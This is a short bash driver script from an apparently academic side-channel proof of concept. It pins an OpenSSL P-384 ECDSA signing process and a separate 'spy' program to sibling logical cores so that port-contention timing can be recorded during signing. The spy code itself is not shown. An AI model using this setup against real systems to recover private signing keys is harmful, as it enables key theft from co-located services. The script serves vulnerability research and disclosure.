#!/bin/bash

#   Copyright 2018-2019 Alejandro Cabrera Aldaya, Billy Bob Brumley, Sohaib ul Hassan, Cesar Pereida García and Nicola Tuveri
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.


OPENSSL=/usr/local/ssl/bin/openssl
KEY_CURVE=secp384r1
KEY_FILE=$KEY_CURVE.pem

make clean
make
pkill spy
rm -f pipe.fifo

# create a P-384 key pair if it does not exist
if [ ! -f $KEY_FILE ]; then
    $OPENSSL ecparam -genkey -name $KEY_CURVE -out $KEY_FILE
    $OPENSSL ec -in $KEY_FILE -pubout >> $KEY_FILE
fi

# create pipe
mkfifo pipe.fifo

# Victims: exactly one of these should active at runtime, so make sure exactly one is commented out.

# Victim 1: start signing but it will be blocked
taskset -c 7 $OPENSSL dgst -sha512 -sign $KEY_FILE -out data.sig pipe.fifo &

# Victim 2: start scalar multiplication but it will be blocked
#taskset -c 7 ./ecc M 4 000084210000842100008421000084210000842100008421000084210000842100008421000084210000842100008421 &

sleep 0.1

# Spy: must be on same physical core, but different logical core
# start spying and generate the message to be signed
taskset -c 3 ./spy

# wait to finish the signature/spying
wait

# reproduce the message file (all zeroes)
dd if=/dev/zero of=data.bin bs=1 count=1K

# remove pipe
rm -f pipe.fifo

pkill spy

